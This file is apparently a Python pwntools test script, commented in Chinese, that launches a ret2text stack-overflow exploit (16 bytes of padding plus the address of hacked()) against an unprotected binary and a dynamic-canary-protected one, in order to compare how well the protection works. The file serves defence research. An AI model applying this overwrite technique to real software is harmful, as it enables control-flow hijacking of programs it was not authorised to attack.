# Copyright 2026 DynamicCanaryProject Authors
#
# 文件名: exp.py
# 功能描述: Ret2Text 攻击对比验证脚本。
#
#           对同一份漏洞逻辑分别编译的两个版本（无保护的 vuln_app 和
#           动态 Canary 保护的 protected_app）发起 Ret2Text 攻击：
#             - vuln_app     : 攻击预期成功，控制流被劫持至 hacked()。
#             - protected_app: 攻击预期被拦截，动态 Canary 检测到溢出。
#
#           攻击原理：
#             计算 buf 到返回地址的偏移量（offset = 16），构造 Payload 将
#             返回地址覆盖为 hacked() 函数的固定地址，实现控制流劫持。
#
# 依赖工具: pwntools
# 作者: 陈文嘉
# 创建日期: 2026-04-15

from pwn import *

context.log_level = 'error'

def exploit(binary_name):
    """对指定二进制发起 Ret2Text 攻击并打印结果。

    Args:
        binary_name: 目标二进制文件名（位于 ../output/ 目录下）。
    """
    print(f"\n================ 测试目标: {binary_name} ================")
    
    elf = ELF(f'../output/{binary_name}')
    target_addr = elf.symbols['hacked']
    print(f"[*] 解析到 hacked() 函数固定地址: {hex(target_addr)}")

    offset = 16
    payload = b"A" * offset
    payload += p64(target_addr)

    print(f"[*] 注入 Payload: {payload}")

    try:
        # 直接启动程序，不带任何参数
        p = process(f'../output/{binary_name}')
        
        # 等待程序打印出 "请输入内容: "
        p.recvuntil(b": ")
        
        # 将带有空字符的 Payload 当作纯字节流发过去！
        p.send(payload)
        
        # 接收后续所有输出并打印
        output = p.recvall(timeout=1).decode('utf-8', 'ignore')
        print(output)
        
    except EOFError:
        print("[-] 程序异常崩溃 (Segmentation fault)")

exploit('vuln_app')
exploit('protected_app')